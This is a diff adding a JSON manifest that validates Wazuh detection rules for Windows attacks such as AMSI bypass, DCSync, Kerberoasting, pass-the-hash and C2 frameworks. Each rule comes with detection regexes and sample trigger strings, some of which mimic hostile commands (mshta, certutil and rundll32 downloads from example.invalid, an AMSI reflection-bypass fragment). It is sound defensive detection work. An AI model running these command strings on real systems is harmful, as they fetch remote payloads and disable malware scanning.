@@ -1,0 +1,1049 @@
+﻿{
+    "schema":  "wazuh-local-rule-validation/v1",
+    "generated_at":  "2026-06-02T11:14:28.2213727+02:00",
+    "source_rules":  "C:\\Users\\rfk\\Documents\\Reguły Wazuh\\wazuh\\local_rules.xml",
+    "safety_model":  "Endpoint scripts generate benign process/script-block telemetry with unique markers. Server-only entries must be checked against native integrations or Wazuh alerts.",
+    "rules":  [
+                  {
+                      "id":  "100601",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "INITIAL ACCESS [T1566.001]: Malicious macro - Office spawned shell process",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "initial_access",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.parentProcessName",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(winword|excel|powerpnt|onenote)\\.exe$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.processName",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(cmd|powershell|wscript|cscript|mshta|regsvr32|rundll32)\\.exe$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100604",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "INITIAL ACCESS [T1189]: MSHTA remote script execution (living-off-the-land)",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "initial_access",
+                                     "lolbas"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(mshta\\.exe\\s+https?:|mshta.*vbscript:|mshta.*javascript:)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "mshta.exe https://example.invalid/payload.hta",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100615",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "DEFENSE EVASION [T1562.001]: AMSI bypass attempt detected in command line",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "defense_evasion",
+                                     "amsi_bypass"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(amsi\\.dll|AmsiScanBuffer|AmsiInitFailed|amsiContext)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "AmsiScanBuffer AmsiInitFailed amsiContext amsiUtils",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100616",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "DEFENSE EVASION [T1562.001]: PowerShell reflection AMSI bypass",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "defense_evasion",
+                                     "amsi_bypass",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)\\[Ref\\]\\.Assembly\\.GetType.*System\\.Management\\.Automation.*NonPublic"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "[Ref].Assembly.GetType(\u0027System.Management.Automation.AmsiUtils\u0027).GetField(\u0027x\u0027,\u0027NonPublic\u0027)",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100647",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PRIVILEGE ESCALATION [T1548.002]: Known UAC bypass tool signature",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "privilege_escalation",
+                                     "uac_bypass"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)bypassuac|UACMe|akagi|elevate.*token"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "UACMe akagi bypassuac elevate token",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100660",
+                      "level":  15,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1003.006]: DCSync attack detected - AD credential replication",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "dcsync",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(lsadump::dcsync|mimikatz.*dcsync|invoke-dcsync|DRSGetNCChanges)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "mimikatz lsadump::dcsync DRSGetNCChanges",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100676",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1558.003]: Kerberoasting tool execution detected",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "kerberoasting",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(invoke-kerberoast|rubeus.*kerberoast|GetUserSPNs|impacket.*GetUserSPNs)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "Rubeus.exe kerberoast GetUserSPNs",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100691",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1558.004]: AS-REP Roasting tool detected",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "asrep_roasting",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(invoke-asreproast|rubeus.*asreproast|GetNPUsers|impacket.*GetNPUsers)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "Rubeus.exe asreproast GetNPUsers",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100705",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1649]: ADCS abuse tool detected (Certify/Certipy)",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "adcs_abuse"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(certify|certipy|pkiview|certutil.*-ca\\b|adcs.*vuln)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "certipy adcs vuln certify pkiview getTGTpkinit",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100707",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "DEFENSE EVASION [T1140]: CertUtil used for encode/decode or download",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "defense_evasion",
+                                     "lolbas"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)certutil.*(encode|decode|-urlcache|-f\\s+http)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "certutil -urlcache -f http://example.invalid/payload.bin",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100720",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "DISCOVERY [T1069.002]: BloodHound/AD enumeration tool detected",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "discovery",
+                                     "bloodhound"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(SharpHound|bloodhound|invoke-bloodhound|AzureHound|ADCollector)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "SharpHound invoke-bloodhound AzureHound ADCollector",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100735",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "LATERAL MOVEMENT [T1550.002]: Pass-the-Hash attack detected",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "lateral_movement",
+                                     "pth",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(sekurlsa::pth|invoke-pth|pass.*hash|pth-winexe|crackmapexec.*-H\\s+[a-f0-9]{32})"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "sekurlsa::pth invoke-pth pass the hash crackmapexec -H 0123456789abcdef0123456789abcdef",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100736",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "LATERAL MOVEMENT [T1550.003]: Pass-the-Ticket detected",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "lateral_movement",
+                                     "ptt",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(rubeus.*ptt|kerberos::ptt|invoke-ptt|mimikatz.*ticket)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "rubeus ptt kerberos::ptt invoke-ptt mimikatz ticket",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100750",
+                      "level":  15,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "C2 [T1071]: Cobalt Strike indicator in command line",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "c2",
+                                     "cobaltstrike",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(cobaltstrike|cobalt\\s+strike|beacon\\.exe|cs\\.jar|teamserver)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "cobaltstrike cobalt strike beacon.exe cs.jar teamserver",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100751",
+                      "level":  15,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "C2 [T1071]: Modern C2 framework indicator (Sliver/Havoc/BRC4)",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "c2",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(sliver|havoc\\s+framework|brute\\s+ratel|nighthawk\\.exe|deimos\\.exe)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "sliver havoc framework brute ratel nighthawk.exe deimos.exe",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100752",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "C2 [T1071]: Metasploit/Meterpreter indicator detected",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "c2"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(meterpreter|metasploit|msf.*handler|multi\\/handler)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "meterpreter metasploit msf handler multi/handler",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100753",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "C2 [T1105]: LOLBAS used to download payload (potential C2 stager)",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "c2",
+                                     "lolbas"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(rundll32.*http|regsvr32.*http|regasm.*http|installutil.*http)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "rundll32.exe http://example.invalid/a.dll regsvr32.exe https://example.invalid/a.sct",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100766",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "C2 [T1071.004]: Known DNS tunneling tool detected",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "c2",
+                                     "dns_tunnel"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(iodine|dnscat|dns2tcp|dns\\s+tunnel|dnstunnel)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "iodine dnscat dns2tcp dns tunnel dnstunnel",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100855",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1110]: Failed logon attempt (brute force monitor)",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "brute_force"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^4625$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100856",
+                      "level":  15,
+                      "frequency":  10,
+                      "timeframe":  60,
+                      "description":  "CREDENTIAL ACCESS [T1110.001]: Brute force - 10 failed logons in 60s from same IP",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+                                             "100855"
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "brute_force",
+                                     "critical"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100857",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1555]: Password manager / credential store dumping",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(lazagne|credentialfileview|dumpCredStore|vault.*dump|keethief)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "lazagne credentialfileview dumpCredStore vault dump keethief",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100872",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "LATERAL MOVEMENT [T1570]: Suspicious service installed from temp/public path",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "lateral_movement",
+                                     "persistence"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^7045$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.serviceFileName",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(\\\\temp\\\\|\\\\public\\\\|cmd\\.exe|powershell)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100890",
+                      "level":  6,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "USB / noĹ›nik zewnÄ™trzny podpiÄ™ty: $(win.eventdata.deviceDescription)",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "usb",
+                                     "removable_media",
+                                     "rodo"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^6416$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.classId",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)4d36e967-e325-11ce-bfc1-08002be10318"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100900",
+                      "level":  15,
+                      "frequency":  2,
+                      "timeframe":  600,
+                      "description":  "KILL CHAIN [TA0001]: Multiple initial access techniques from same source",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+                                               "initial_access"
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "kill_chain",
+                                     "critical"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+                                                   "100604"
+                                               ]
+                  },
+                  {
+                      "id":  "100901",
+                      "level":  15,
+                      "frequency":  2,
+                      "timeframe":  600,
+                      "description":  "KILL CHAIN [T1003.006+T1550]: DCSync followed by credential use - APT confirmed",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+                                               "dcsync"
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "kill_chain",
+                                     "apt",
+                                     "critical"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+                                                   "100660"
+                                               ]
+                  },
+                  {
+                      "id":  "100902",
+                      "level":  15,
+                      "frequency":  2,
+                      "timeframe":  600,
+                      "description":  "KILL CHAIN [T1558.003]: Multiple Kerberoasting indicators from same source",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+                                               "kerberoasting"
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "kill_chain",
+                                     "critical"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+                                                   "100676"
+                                               ]
+                  },
+                  {
+                      "id":  "100903",
+                      "level":  15,
+                      "frequency":  2,
+                      "timeframe":  600,
+                      "description":  "KILL CHAIN [T1550]: Pass-the-Hash AND Pass-the-Ticket - full credential abuse",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+                                               "lateral_movement"
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "kill_chain",
+                                     "critical"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+                                                   "100735",
+                                                   "100736"
+                                               ]
+                  },
+                  {
+                      "id":  "100904",
+                      "level":  15,
+                      "frequency":  2,
+                      "timeframe":  600,
+                      "description":  "KILL CHAIN [TA0011]: Active C2 framework confirmed - incident response required",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+                                               "c2"
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "kill_chain",
+                                     "c2",
+                                     "critical"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+                                                   "100750",
+                                                   "100751",
+                                                   "100752",
+                                                   "100753",
+                                                   "100766"
+                                               ]
+                  }
+              ]
+}
